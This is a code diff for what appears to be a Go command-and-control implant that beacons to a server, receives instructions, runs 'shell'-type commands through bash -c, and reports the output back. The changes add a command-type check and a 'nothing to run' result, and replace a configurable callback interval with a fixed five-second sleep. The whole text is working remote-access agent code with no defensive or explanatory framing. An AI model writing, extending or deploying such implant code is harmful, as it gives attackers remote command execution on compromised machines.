@@ -6,7 +6,6 @@ import (
 	"log"
 	"net"
 	"os/exec"
-	"strconv"
 	"strings"
 	"time"
 
@@ -51,13 +50,15 @@ func main() {
 			log.Fatalln(err)
 		}
 		logger.Logf(logger.Debug, "Received : %s\n", instruct)
-		message1 := instruct.Command
+		CommandType := instruct.CommandType
+		Command := instruct.Command
 		CmdOut := ""
-		if message1 != "" {
-			logger.Logf(logger.Debug, "Command to run : %s\n", message1)
+		destruct := types.GiveServerResult{}
+		if CommandType == "shell" && Command != "" {
+			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
 			// tokens := strings.Split(message1, " ")
 			var c *exec.Cmd
-			c = exec.Command("bash", "-c", message1)
+			c = exec.Command("bash", "-c", Command)
 			// if len(tokens) == 1 {
 			// 	c = exec.Command(tokens[0])
 			// } else {
@@ -70,13 +71,21 @@ func main() {
 			CmdOut += string(buf)
 			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
 			// beacon.Write(buf)
+			destruct = types.GiveServerResult{
+				Uuid:        instruct.UpdateAgentConfig.Uuid,
+				Result:      "1",
+				Output:      CmdOut,
+				CommandUUID: instruct.CommandUUID,
+			}
+		} else { // if CommandType == ""
+			destruct = types.GiveServerResult{
+				Uuid:        instruct.UpdateAgentConfig.Uuid,
+				Result:      "2", // meaning nothing to run
+				Output:      "",
+				CommandUUID: instruct.CommandUUID,
+			}
 		}
-		destruct := types.GiveServerResult{
-			Uuid:        instruct.UpdateAgentConfig.Uuid,
-			Result:      "1",
-			Output:      CmdOut,
-			CommandUUID: instruct.CommandUUID,
-		}
+
 		err = encoder.Encode(destruct)
 		if err != nil {
 			log.Fatalln(err)
@@ -87,8 +96,8 @@ func main() {
 		// 	continue
 		// }
 		beacon.Close()
-		intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
-		time.Sleep(time.Second * time.Duration(intVar))                           // interval and jitter here
+		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
+		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
 	}
 
 }
